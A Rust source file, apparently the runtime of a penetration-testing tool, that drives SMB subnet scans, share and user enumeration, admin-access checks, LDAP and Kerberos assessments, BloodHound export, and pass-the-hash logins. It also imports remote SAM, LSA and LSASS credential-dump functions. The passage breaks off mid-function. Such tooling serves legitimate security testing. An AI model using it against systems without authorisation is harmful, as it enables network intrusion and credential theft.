use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use tokio::runtime::{Builder, Runtime};
use tokio::sync::mpsc::UnboundedSender;
use tokio::task::JoinSet;
use tokio::time::{Duration, sleep};

use netraze_protocols::smb::connection::is_port_open;
use netraze_protocols::smb::{
    SmbClient, SmbCredential, SmbScanResult, create_directory, delete_remote_directory,
    delete_remote_file, download_file, enum_av, execute_command_live, list_directory,
    remote_dump_lsa, remote_dump_sam, remote_lsass_dump, smb_fingerprint, upload_file,
};
use netraze_protocols::targets::parse_target_list;

use crate::state::{CredentialRecord, ScanCredentialPlan};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum LogLevel {
    Info,
    Warning,
    Success,
    Error,
}

#[derive(Debug, Clone)]
pub enum RuntimeEvent {
    Log {
        level: LogLevel,
        message: String,
    },
    SmbResult {
        result: Box<SmbScanResult>,
        credential_label: Option<String>,
    },
    ScanProgress {
        done: usize,
        total: usize,
    },
    ScanStarted {
        target_label: String,
    },
    /// A host whose SMB port passed the pre-scan. This arrives before the
    /// slower authentication and RPC enumeration stages complete.
    SmbHostDiscovered {
        target: String,
    },
    ScanFinished,
    LoginResult {
        ip: String,
        cred_label: String,
        success: bool,
        admin: bool,
    },
    ShareEnumResult {
        host_node_id: usize,
        ip: String,
        hostname: String,
        shares: Vec<String>,
        error: Option<String>,
        /// Label of the credential that ran the enumeration — stored on the
        /// SharesNode so later Browse clicks can resolve it back.
        cred_label: Option<String>,
    },
    BrowseResult {
        browser_id: usize,
        entries: Vec<(String, bool, u64)>,
        error: Option<String>,
    },
    FileOpResult {
        browser_id: usize,
        success: bool,
        message: String,
    },
    UserEnumResult {
        host_node_id: usize,
        ip: String,
        hostname: String,
        result: Result<netraze_protocols::users::UserEnumerationOutcome, String>,
    },
    DirectoryResult {
        endpoint: String,
        cred_label: String,
        result: Box<Result<netraze_core::DirectoryInventory, String>>,
    },
    KerberosResult {
        endpoint: String,
        realm: String,
        cred_label: Option<String>,
        result: Result<netraze_protocols::kerberos::KerberosAssessmentOutcome, String>,
        ticket: Option<netraze_protocols::kerberos::TicketGrantingTicket>,
    },
    BloodHoundProgress {
        endpoint: String,
        progress: netraze_protocols::ldap::BloodHoundCeProgress,
    },
    BloodHoundResult {
        endpoint: String,
        result: Result<netraze_protocols::ldap::BloodHoundCeArtifacts, String>,
    },
    DumpResult {
        host_node_id: usize,
        ip: String,
        hostname: String,
        dump_type: String,
        entries: Vec<String>,
        error: Option<String>,
    },
    EnumAvResult {
        host_node_id: usize,
        ip: String,
        hostname: String,
        products: Vec<String>,
        error: Option<String>,
    },
    FingerprintResult {
        ip: String,
        hostname: String,
        domain: String,
        os_info: String,
        signing: bool,
        smbv1: bool,
    },
    ExecResult {
        console_id: u64,
        command: String,
        output: String,
        error: Option<String>,
    },
}

// Keep backward compat alias
pub type RuntimeLogEvent = RuntimeEvent;

#[derive(Debug, Clone)]
pub struct KerberosScanOptions {
    pub realm: Option<String>,
    pub kdc_override: Option<String>,
    pub assess_as_rep: bool,
    pub assess_spns: bool,
    pub use_ldap_discovery: bool,
    pub explicit_principals: Vec<String>,
    pub explicit_spns: Vec<netraze_protocols::kerberos::ServicePrincipalTarget>,
    pub inventories: HashMap<String, netraze_core::DirectoryInventory>,
    pub ticket_path: Option<String>,
    pub ticket_service_host: Option<String>,
}

#[derive(Debug)]
pub struct RuntimeServices {
    runtime: Runtime,
    log_tx: UnboundedSender<RuntimeEvent>,
}

impl RuntimeServices {
    pub fn new(log_tx: UnboundedSender<RuntimeEvent>) -> Self {
        let runtime = Builder::new_multi_thread()
            .enable_all()
            .build()
            .expect("Impossible de creer le runtime tokio");

        Self { runtime, log_tx }
    }

    pub fn spawn_heartbeat(&self) {
        self.runtime.spawn(async move {
            loop {
                sleep(Duration::from_secs(5)).await;
            }
        });
    }

    /// Launch a real SMB scan against one or more targets.
    /// Supports CIDR notation, IP ranges, and single IPs.
    /// Does a port 445 pre-scan to filter live hosts before full enumeration.
    pub fn spawn_smb_scan(
        &self,
        raw_targets: Vec<String>,
        credential_plan: ScanCredentialPlan,
        threads: usize,
        timeout_seconds: u64,
    ) {
        let tx = self.log_tx.clone();

        self.runtime.spawn(async move {
            // Send the original target string for subnet label
            let target_label = raw_targets.join(", ");
            let _ = tx.send(RuntimeEvent::ScanStarted {
                target_label: target_label.clone(),
            });

            // Phase 1: Expand CIDR/ranges into individual IPs
            let all_ips: Vec<String> = raw_targets
                .iter()
                .flat_map(|t| parse_target_list(t))
                .collect();

            let total_ips = all_ips.len();
            let _ = tx.send(RuntimeEvent::Log {
                level: LogLevel::Info,
                message: format!(
                    "Expansion des cibles: {} entrée(s) → {} IP(s)",
                    raw_targets.len(),
                    total_ips
                ),
            });

            if total_ips == 0 {
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Error,
                    message: "Aucune cible valide".to_owned(),
                });
                let _ = tx.send(RuntimeEvent::ScanFinished);
                return;
            }

            // Phase 2: Port 445 pre-scan (parallel via spawn_blocking)
            let _ = tx.send(RuntimeEvent::Log {
                level: LogLevel::Info,
                message: format!("Pré-scan port 445 sur {} IP(s)...", total_ips),
            });

            let timeout_ms = (timeout_seconds * 1000).min(3000);
            let chunk_size = threads.max(1);
            let mut live_hosts: Vec<String> = Vec::new();
            let mut scanned: usize = 0;

            for chunk in all_ips.chunks(chunk_size) {
                let mut handles = Vec::new();
                for ip in chunk {
                    let ip_clone = ip.clone();
                    handles.push(tokio::task::spawn_blocking(move || {
                        let open = is_port_open(&ip_clone, 445, timeout_ms);
                        (ip_clone, open)
                    }));
                }

                for handle in handles {
                    if let Ok((ip, open)) = handle.await {
                        scanned += 1;
                        if open {
                            live_hosts.push(ip.clone());
                            let _ = tx.send(RuntimeEvent::SmbHostDiscovered { target: ip.clone() });
                            let endpoint = netraze_protocols::targets::with_default_port(&ip, 445);
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Success,
                                message: format!("  ✓ {endpoint} TCP ouvert"),
                            });
                        }
                        let _ = tx.send(RuntimeEvent::ScanProgress {
                            done: scanned,
                            total: total_ips + live_hosts.len() * 5, // estimate
                        });
                    }
                }
            }

            let _ = tx.send(RuntimeEvent::Log {
                level: LogLevel::Info,
                message: format!(
                    "Pré-scan terminé: {}/{} endpoint(s) TCP ouvert(s)",
                    live_hosts.len(),
                    total_ips
                ),
            });

            if live_hosts.is_empty() {
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Warning,
                    message: "Aucun hôte avec port 445 ouvert".to_owned(),
                });
                let _ = tx.send(RuntimeEvent::ScanFinished);
                return;
            }

            // Phase 3: Full SMB enumeration on live hosts
            let total_live = live_hosts.len();
            // total_steps = pre-scan done + 5 steps per live host
            let total_steps = total_ips + total_live * 5;
            let mut step = total_ips; // pre-scan already done

            for (idx, target) in live_hosts.iter().enumerate() {
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Info,
                    message: format!("[{}/{}] SMB scan: {}...", idx + 1, total_live, target),
                });

                let credential = match credential_plan.for_target(target) {
                    Ok(credential) => credential,
                    Err(error) => {
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Error,
                            message: format!("{target}: SMB scan skipped: {error}"),
                        });
                        let _ = tx.send(RuntimeEvent::SmbResult {
                            result: Box::new(SmbScanResult {
                                target: target.clone(),
                                hostname: None,
                                os_info: None,
                                signing: None,
                                smb_version: None,
                                shares: Vec::new(),
                                users: Vec::new(),
                                admin: false,
                                error: Some(error),
                            }),
                            credential_label: None,
                        });
                        step += 5;
                        let _ = tx.send(RuntimeEvent::ScanProgress {
                            done: step,
                            total: total_steps,
                        });
                        continue;
                    }
                };
                let credential_label = credential
                    .as_ref()
                    .map(crate::state::cred_label)
                    .unwrap_or_else(|| "(anonymous)".to_owned());
                let mut client = SmbClient::new(target);
                if let Some(ref cred) = credential {
                    match cred_to_smb(cred) {
                        Ok(smb_credential) => {
                            client = client.with_credential(smb_credential);
                        }
                        Err(error) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("{target}: SMB scan skipped: {error}"),
                            });
                            let _ = tx.send(RuntimeEvent::SmbResult {
                                result: Box::new(SmbScanResult {
                                    target: target.clone(),
                                    hostname: None,
                                    os_info: None,
                                    signing: None,
                                    smb_version: None,
                                    shares: Vec::new(),
                                    users: Vec::new(),
                                    admin: false,
                                    error: Some(error),
                                }),
                                credential_label: Some(credential_label),
                            });
                            step += 5;
                            let _ = tx.send(RuntimeEvent::ScanProgress {
                                done: step,
                                total: total_steps,
                            });
                            continue;
                        }
                    }
                }

                // Step 0: Fingerprint (no auth needed)
                {
                    let fp_target = target.clone();
                    let fp_tx = tx.clone();
                    let fp_result =
                        tokio::task::spawn_blocking(move || smb_fingerprint(&fp_target)).await;
                    if let Ok(Ok(fp)) = fp_result {
                        let nxc_line = fp.nxc_line(target);
                        let _ = fp_tx.send(RuntimeEvent::Log {
                            level: LogLevel::Success,
                            message: nxc_line,
                        });
                        let _ = fp_tx.send(RuntimeEvent::FingerprintResult {
                            ip: target.clone(),
                            hostname: fp.hostname,
                            domain: if fp.dns_domain.is_empty() {
                                fp.domain
                            } else {
                                fp.dns_domain
                            },
                            os_info: fp.os_info,
                            signing: fp.signing,
                            smbv1: fp.smbv1,
                        });
                    }
                }

                // Step 1: Connect
                let connect_err = client.connect().await.err();
                step += 1;
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: step,
                    total: total_steps,
                });

                if let Some(err) = connect_err {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{}: ERREUR connexion - {}", target, err),
                    });
                    let result = SmbScanResult {
                        target: target.clone(),
                        hostname: None,
                        os_info: None,
                        signing: None,
                        smb_version: None,
                        shares: Vec::new(),
                        users: Vec::new(),
                        admin: false,
                        error: Some(err),
                    };
                    let _ = tx.send(RuntimeEvent::SmbResult {
                        result: Box::new(result),
                        credential_label: None,
                    });
                    step += 4;
                    let _ = tx.send(RuntimeEvent::ScanProgress {
                        done: step,
                        total: total_steps,
                    });
                    continue;
                }

                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Info,
                    message: format!("{}: connecté, récupération infos...", target),
                });

                // Step 2: Server info
                let server_info = client.server_info().await.ok();
                step += 1;
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: step,
                    total: total_steps,
                });

                if let Some(ref si) = server_info {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Info,
                        message: format!("{}: {} ({})", target, si.name, si.os_version),
                    });
                }

                // Step 3: Shares (with access checks)
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Info,
                    message: format!("{}: énumération des partages...", target),
                });
                let shares = match client.enum_shares_with_access().await {
                    Ok(shares) => shares,
                    Err(error) => {
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Warning,
                            message: format!("{target}: share enumeration failed: {error}"),
                        });
                        Vec::new()
                    }
                };
                step += 1;
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: step,
                    total: total_steps,
                });

                for share in &shares {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Info,
                        message: format!(
                            "  {} [{}] ({}) {}",
                            share.name,
                            share.share_type.display_str(),
                            share.access.display_str(),
                            share.remark
                        ),
                    });
                }

                // Step 4: Admin check
                let admin = client.check_admin().await;
                step += 1;
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: step,
                    total: total_steps,
                });

                // Step 5: Users (if admin) + disconnect
                let mut users = Vec::new();
                if admin {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Success,
                        message: format!("{}: Pwn3d! (accès admin)", target),
                    });
                    users = match client.enum_users().await {
                        Ok(users) => users,
                        Err(error) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Warning,
                                message: format!("{target}: user enumeration failed: {error}"),
                            });
                            Vec::new()
                        }
                    };
                    for user in &users {
                        let utag = if user.disabled {
                            "DISABLED"
                        } else if user.locked {
                            "LOCKED"
                        } else {
                            "ACTIVE"
                        };
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Info,
                            message: format!("  User: {} [{}]", user.name, utag),
                        });
                    }
                }
                client.disconnect().await;
                step += 1;
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: step,
                    total: total_steps,
                });

                let admin_tag = if admin { " (Pwn3d!)" } else { "" };
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Success,
                    message: format!(
                        "{}: {} - {} partage(s){}",
                        target,
                        server_info.as_ref().map(|s| s.name.as_str()).unwrap_or("?"),
                        shares.len(),
                        admin_tag
                    ),
                });

                let result = SmbScanResult {
                    target: target.clone(),
                    hostname: server_info.as_ref().map(|s| s.name.clone()),
                    os_info: server_info.as_ref().map(|s| s.os_version.clone()),
                    signing: None,
                    smb_version: None,
                    shares,
                    users,
                    admin,
                    error: None,
                };
                let _ = tx.send(RuntimeEvent::SmbResult {
                    result: Box::new(result),
                    credential_label: Some(credential_label),
                });
            }

            let _ = tx.send(RuntimeEvent::Log {
                level: LogLevel::Success,
                message: "SMB scan terminé".to_owned(),
            });
            let _ = tx.send(RuntimeEvent::ScanFinished);
        });
    }

    /// Launch LDAP directory discovery with each target's selected login. Targets are processed in
    /// bounded batches so a large CIDR cannot create an unbounded task set.
    pub fn spawn_ldap_scan(
        &self,
        raw_targets: Vec<String>,
        credential_plan: ScanCredentialPlan,
        threads: usize,
        timeout_seconds: u64,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let target_label = raw_targets.join(", ");
            let _ = tx.send(RuntimeEvent::ScanStarted { target_label });
            let targets = raw_targets
                .iter()
                .flat_map(|target| parse_target_list(target))
                .collect::<Vec<_>>();
            let total = targets.len();
            if total == 0 {
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Error,
                    message: "Aucune cible LDAP valide".to_owned(),
                });
                let _ = tx.send(RuntimeEvent::ScanFinished);
                return;
            }

            let timeout = Duration::from_secs(timeout_seconds.max(1));
            let mut completed = 0_usize;
            for batch in targets.chunks(threads.max(1)) {
                let mut tasks = JoinSet::new();
                for target in batch {
                    let endpoint = netraze_protocols::targets::with_default_port(target, 389);
                    let credential = match credential_plan.for_target(target) {
                        Ok(Some(credential)) => credential,
                        Ok(None) => crate::state::anonymous_record(),
                        Err(error) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("{endpoint}: LDAP scan skipped: {error}"),
                            });
                            let _ = tx.send(RuntimeEvent::DirectoryResult {
                                endpoint,
                                cred_label: "(unavailable)".to_owned(),
                                result: Box::new(Err(error)),
                            });
                            completed += 1;
                            let _ = tx.send(RuntimeEvent::ScanProgress {
                                done: completed,
                                total,
                            });
                            continue;
                        }
                    };
                    let label = crate::state::cred_label(&credential);
                    let authentication = match cred_to_ldap_auth(&credential) {
                        Ok(authentication) => authentication,
                        Err(error) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("{endpoint}: LDAP scan skipped: {error}"),
                            });
                            let _ = tx.send(RuntimeEvent::DirectoryResult {
                                endpoint,
                                cred_label: label,
                                result: Box::new(Err(error)),
                            });
                            completed += 1;
                            let _ = tx.send(RuntimeEvent::ScanProgress {
                                done: completed,
                                total,
                            });
                            continue;
                        }
                    };
                    let secret = credential.secret;
                    tasks.spawn(async move {
                        let mut config = netraze_protocols::ldap::LdapClientConfig::new(&endpoint);
                        config.connect_timeout = timeout;
                        config.operation_timeout = timeout;
                        let result = netraze_protocols::ldap::inventory_with_authentication(
                            config,
                            authentication,
                        )
                        .await
                        .map_err(|error| redact_secret(&error.to_string(), &secret));
                        (endpoint, label, result)
                    });
                }
                while let Some(joined) = tasks.join_next().await {
                    completed += 1;
                    match joined {
                        Ok((endpoint, label, result)) => {
                            let (level, message) = match &result {
                                Ok(inventory) => (
                                    LogLevel::Success,
                                    format!(
                                        "{endpoint}: LDAP discovery completed ({} users, {} groups, {} computers)",
                                        inventory.users.items.len(),
                                        inventory.groups.items.len(),
                                        inventory.computers.items.len()
                                    ),
                                ),
                                Err(error) => (
                                    LogLevel::Error,
                                    format!("{endpoint}: LDAP discovery failed: {error}"),
                                ),
                            };
                            let _ = tx.send(RuntimeEvent::Log { level, message });
                            let _ = tx.send(RuntimeEvent::DirectoryResult {
                                endpoint,
                                cred_label: label,
                                result: Box::new(result),
                            });
                        }
                        Err(error) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("LDAP discovery task failed: {error}"),
                            });
                        }
                    }
                    let _ = tx.send(RuntimeEvent::ScanProgress {
                        done: completed,
                        total,
                    });
                }
            }
            let _ = tx.send(RuntimeEvent::ScanFinished);
        });
    }

    /// Launch LDAP inventory with one exact imported `ldap/host` ticket.
    /// Ticket bytes remain in the selected file and are never copied into a
    /// workspace or runtime event.
    pub fn spawn_ldap_ticket_scan(
        &self,
        raw_targets: Vec<String>,
        ticket_path: String,
        service_host: String,
        threads: usize,
        timeout_seconds: u64,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let _ = tx.send(RuntimeEvent::ScanStarted {
                target_label: raw_targets.join(", "),
            });
            let targets = raw_targets
                .iter()
                .flat_map(|target| parse_target_list(target))
                .collect::<Vec<_>>();
            let cache = match netraze_protocols::kerberos::import_ticket_file(&ticket_path) {
                Ok(cache) => cache,
                Err(error) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("Kerberos ticket import failed: {error}"),
                    });
                    let _ = tx.send(RuntimeEvent::ScanFinished);
                    return;
                }
            };
            let selector = netraze_protocols::kerberos::TicketSelector {
                service_principal: Some(format!("ldap/{service_host}")),
                ..netraze_protocols::kerberos::TicketSelector::default()
            };
            let ticket = match cache
                .select(&selector)
                .and_then(netraze_protocols::kerberos::KerberosTicket::to_service_ticket)
            {
                Ok(ticket) => ticket,
                Err(error) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!(
                            "Kerberos ticket selection for ldap/{service_host} failed: {error}"
                        ),
                    });
                    let _ = tx.send(RuntimeEvent::ScanFinished);
                    return;
                }
            };
            let label = format!(
                "{}@{} (Kerberos)",
                ticket.client_principal(),
                ticket.realm()
            );
            let timeout = Duration::from_secs(timeout_seconds.max(1));
            let total = targets.len();
            let mut completed = 0_usize;
            for batch in targets.chunks(threads.max(1)) {
                let mut tasks = JoinSet::new();
                for target in batch {
                    let endpoint = netraze_protocols::targets::with_default_port(target, 389);
                    let ticket = ticket.clone();
                    let service_host = service_host.clone();
                    let label = label.clone();
                    tasks.spawn(async move {
                        let mut config = netraze_protocols::ldap::LdapClientConfig::new(&endpoint);
                        config.connect_timeout = timeout;
                        config.operation_timeout = timeout;
                        let result = netraze_protocols::ldap::inventory_with_authentication(
                            config,
                            netraze_protocols::ldap::LdapAuthentication::Kerberos {
                                service_host,
                                ticket: Box::new(ticket),
                            },
                        )
                        .await
                        .map_err(|error| error.to_string());
                        (endpoint, label, result)
                    });
                }
                while let Some(joined) = tasks.join_next().await {
                    completed += 1;
                    match joined {
                        Ok((endpoint, label, result)) => {
                            let (level, message) = match &result {
                                Ok(inventory) => (
                                    LogLevel::Success,
                                    format!(
                                        "{endpoint}: LDAP Kerberos discovery completed ({} users, {} groups, {} computers)",
                                        inventory.users.items.len(),
                                        inventory.groups.items.len(),
                                        inventory.computers.items.len()
                                    ),
                                ),
                                Err(error) => (
                                    LogLevel::Error,
                                    format!("{endpoint}: LDAP Kerberos discovery failed: {error}"),
                                ),
                            };
                            let _ = tx.send(RuntimeEvent::Log { level, message });
                            let _ = tx.send(RuntimeEvent::DirectoryResult {
                                endpoint,
                                cred_label: label,
                                result: Box::new(result),
                            });
                        }
                        Err(error) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("LDAP Kerberos task failed: {error}"),
                            });
                        }
                    }
                    let _ = tx.send(RuntimeEvent::ScanProgress {
                        done: completed,
                        total,
                    });
                }
            }
            let _ = tx.send(RuntimeEvent::ScanFinished);
        });
    }

    /// Launch a read-only SMB scan with one exact imported `cifs/host`
    /// ticket. SRVSVC share enumeration rides the authenticated SMB session.
    pub fn spawn_smb_ticket_scan(
        &self,
        raw_targets: Vec<String>,
        ticket_path: String,
        service_host: String,
        _timeout_seconds: u64,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let _ = tx.send(RuntimeEvent::ScanStarted {
                target_label: raw_targets.join(", "),
            });
            let targets = raw_targets
                .iter()
                .flat_map(|target| parse_target_list(target))
                .collect::<Vec<_>>();
            let cache = match netraze_protocols::kerberos::import_ticket_file(&ticket_path) {
                Ok(cache) => cache,
                Err(error) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("Kerberos ticket import failed: {error}"),
                    });
                    let _ = tx.send(RuntimeEvent::ScanFinished);
                    return;
                }
            };
            let selector = netraze_protocols::kerberos::TicketSelector {
                service_principal: Some(format!("cifs/{service_host}")),
                ..netraze_protocols::kerberos::TicketSelector::default()
            };
            let ticket = match cache
                .select(&selector)
                .and_then(netraze_protocols::kerberos::KerberosTicket::to_service_ticket)
            {
                Ok(ticket) => ticket,
                Err(error) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!(
                            "Kerberos ticket selection for cifs/{service_host} failed: {error}"
                        ),
                    });
                    let _ = tx.send(RuntimeEvent::ScanFinished);
                    return;
                }
            };
            let label = format!(
                "{}@{} (Kerberos)",
                ticket.client_principal(),
                ticket.realm()
            );
            let total = targets.len();
            for (index, target) in targets.into_iter().enumerate() {
                let _ = tx.send(RuntimeEvent::SmbHostDiscovered {
                    target: target.clone(),
                });
                let mut client =
                    SmbClient::new(&target).with_kerberos(&service_host, ticket.clone());
                let result = client.full_scan().await;
                let level = if result.error.is_none() {
                    LogLevel::Success
                } else {
                    LogLevel::Error
                };
                let message = result.error.as_ref().map_or_else(
                    || {
                        format!(
                            "{target}: SMB Kerberos scan completed ({} shares)",
                            result.shares.len()
                        )
                    },
                    |error| format!("{target}: SMB Kerberos scan failed: {error}"),
                );
                let _ = tx.send(RuntimeEvent::Log { level, message });
                let _ = tx.send(RuntimeEvent::SmbResult {
                    result: Box::new(result),
                    credential_label: Some(label.clone()),
                });
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: index + 1,
                    total,
                });
            }
            let _ = tx.send(RuntimeEvent::ScanFinished);
        });
    }

    /// Run bounded Kerberos exposure checks against each selected KDC. LDAP
    /// inventory is reused from the workflow when available and otherwise
    /// collected with the same selected password/NT-hash credential.
    pub fn spawn_kerberos_scan(
        &self,
        raw_targets: Vec<String>,
        credential_plan: ScanCredentialPlan,
        options: KerberosScanOptions,
        timeout_seconds: u64,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let target_label = raw_targets.join(", ");
            let _ = tx.send(RuntimeEvent::ScanStarted { target_label });
            let targets = raw_targets
                .iter()
                .flat_map(|target| parse_target_list(target))
                .collect::<Vec<_>>();
            let total = targets.len();
            if total == 0 {
                let _ = tx.send(RuntimeEvent::Log {
                    level: LogLevel::Error,
                    message: "No valid Kerberos target was supplied".to_owned(),
                });
                let _ = tx.send(RuntimeEvent::ScanFinished);
                return;
            }

            for (index, target) in targets.iter().enumerate() {
                let endpoint = options.kdc_override.as_deref().map_or_else(
                    || netraze_protocols::targets::with_default_port(target, 88),
                    |override_endpoint| {
                        netraze_protocols::targets::with_default_port(override_endpoint, 88)
                    },
                );
                let credential = match credential_plan.for_target(target) {
                    Ok(value) => value,
                    Err(error) => {
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Error,
                            message: format!("{endpoint}: Kerberos scan skipped: {error}"),
                        });
                        let _ = tx.send(RuntimeEvent::KerberosResult {
                            endpoint,
                            realm: options.realm.clone().unwrap_or_default(),
                            cred_label: None,
                            result: Err(error),
                            ticket: None,
                        });
                        let _ = tx.send(RuntimeEvent::ScanProgress {
                            done: index + 1,
                            total,
                        });
                        continue;
                    }
                };
                let label = credential.as_ref().map(crate::state::cred_label).or_else(|| {
                    options.ticket_path.as_ref().and_then(|path| {
                        netraze_protocols::kerberos::import_ticket_file(path)
                            .ok()
                            .map(|cache| {
                                format!(
                                    "{}@{} (Kerberos)",
                                    cache.primary_principal(),
                                    cache.primary_realm()
                                )
                            })
                    })
                });
                let result = run_kerberos_assessment(
                    target,
                    &endpoint,
                    credential.as_ref(),
                    &options,
                    Duration::from_secs(timeout_seconds.max(1)),
                )
                .await;
                let (realm, result, ticket) = match result {
                    Ok((realm, outcome, ticket)) => (realm, Ok(outcome), ticket),
                    Err(error) => (
                        options.realm.clone().unwrap_or_default(),
                        Err(credential.as_ref().map_or(error.clone(), |value| {
                            redact_secret(&error, &value.secret)
                        })),
                        None,
                    ),
                };
                let (level, message) = match &result {
                    Ok(outcome) => (
                        LogLevel::Success,
                        format!(
                            "{endpoint}: Kerberos assessment completed ({} findings, {} target errors)",
                            outcome.findings.len(),
                            outcome.errors.len()
                        ),
                    ),
                    Err(error) => (
                        LogLevel::Error,
                        format!("{endpoint}: Kerberos assessment failed: {error}"),
                    ),
                };
                let _ = tx.send(RuntimeEvent::Log { level, message });
                let _ = tx.send(RuntimeEvent::KerberosResult {
                    endpoint,
                    realm,
                    cred_label: label,
                    result,
                    ticket,
                });
                let _ = tx.send(RuntimeEvent::ScanProgress {
                    done: index + 1,
                    total,
                });
            }
            let _ = tx.send(RuntimeEvent::ScanFinished);
        });
    }

    /// Collect a fresh LDAP graph and export BloodHound Community Edition data.
    pub fn spawn_bloodhound_ce_export(
        &self,
        endpoint: String,
        credential: CredentialRecord,
        output_directory: PathBuf,
        timeout_seconds: u64,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let credential_label = crate::state::cred_label(&credential);
            let authentication = match cred_to_ldap_auth(&credential) {
                Ok(authentication) => authentication,
                Err(error) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{endpoint}: BloodHound CE export skipped: {error}"),
                    });
                    let _ = tx.send(RuntimeEvent::BloodHoundResult {
                        endpoint,
                        result: Err(error),
                    });
                    return;
                }
            };
            let secret = credential.secret;
            let _ = tx.send(RuntimeEvent::Log {
                level: LogLevel::Info,
                message: format!(
                    "{endpoint}: starting BloodHound CE LDAP collection as {credential_label}"
                ),
            });

            let timeout = Duration::from_secs(timeout_seconds.max(1));
            let mut config = netraze_protocols::ldap::LdapClientConfig::new(&endpoint);
            config.connect_timeout = timeout;
            config.operation_timeout = timeout;
            let progress_tx = tx.clone();
            let progress_endpoint = endpoint.clone();
            let result = netraze_protocols::ldap::collect_and_export_ce_with_progress(
                config,
                authentication,
                netraze_protocols::ldap::BloodHoundCeExportOptions::new(output_directory),
                move |progress| {
                    let _ = progress_tx.send(RuntimeEvent::BloodHoundProgress {
                        endpoint: progress_endpoint.clone(),
                        progress,
                    });
                },
            )
            .await
            .map_err(|error| redact_secret(&error.to_string(), &secret));

            let (level, message) = match &result {
                Ok(artifacts) => (
                    LogLevel::Success,
                    format!(
                        "{endpoint}: BloodHound CE export completed ({} objects, {})",
                        artifacts.exported_object_count,
                        artifacts.zip_file.display()
                    ),
                ),
                Err(error) => (
                    LogLevel::Error,
                    format!("{endpoint}: BloodHound CE export failed: {error}"),
                ),
            };
            let _ = tx.send(RuntimeEvent::Log { level, message });
            let _ = tx.send(RuntimeEvent::BloodHoundResult { endpoint, result });
        });
    }

    pub fn emit_log(&self, level: LogLevel, message: impl Into<String>) {
        let _ = self.log_tx.send(RuntimeEvent::Log {
            level,
            message: message.into(),
        });
    }

    pub fn emit_error(&self, message: impl Into<String>) {
        self.emit_log(LogLevel::Error, message);
    }

    /// Attempt SMB login to a host with given credentials.
    pub fn spawn_login_attempt(
        &self,
        ip: String,
        username: String,
        domain: String,
        secret: String,
        cred_type: crate::state::CredType,
    ) {
        let tx = self.log_tx.clone();
        // Same label logic as `state::cred_label` — "(anonymous)" for the
        // null session, `.\user` / `DOMAIN\user` otherwise (guest logins
        // are just users without a secret).
        let cred_label = if username.is_empty() {
            "(anonymous)".to_owned()
        } else if domain.is_empty() {
            format!(".\\{username}")
        } else {
            format!("{domain}\\{username}")
        };
        let cred_label_clone = cred_label.clone();

        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{}: tentative login en tant que {cred_label}...", ip),
        });

        self.runtime.spawn(async move {
            let smb_cred = match cred_type {
                crate::state::CredType::Hash => {
                    match SmbCredential::with_hash(&username, &domain, &secret) {
                        Ok(c) => c,
                        Err(e) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("{ip}: hash invalide: {e}"),
                            });
                            let _ = tx.send(RuntimeEvent::LoginResult {
                                ip,
                                cred_label: cred_label_clone,
                                success: false,
                                admin: false,
                            });
                            return;
                        }
                    }
                }
                crate::state::CredType::Password => SmbCredential::new(&username, &domain, &secret),
                crate::state::CredType::Aes128Key | crate::state::CredType::Aes256Key => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip}: Kerberos AES keys cannot authenticate SMB"),
                    });
                    let _ = tx.send(RuntimeEvent::LoginResult {
                        ip,
                        cred_label: cred_label_clone,
                        success: false,
                        admin: false,
                    });
                    return;
                }
            };
            let mut client = SmbClient::new(&ip).with_credential(smb_cred);
            let login_result = client.connect().await;
            let success = login_result.is_ok();
            let error_detail = login_result.err();
            let mut admin = false;

            if success {
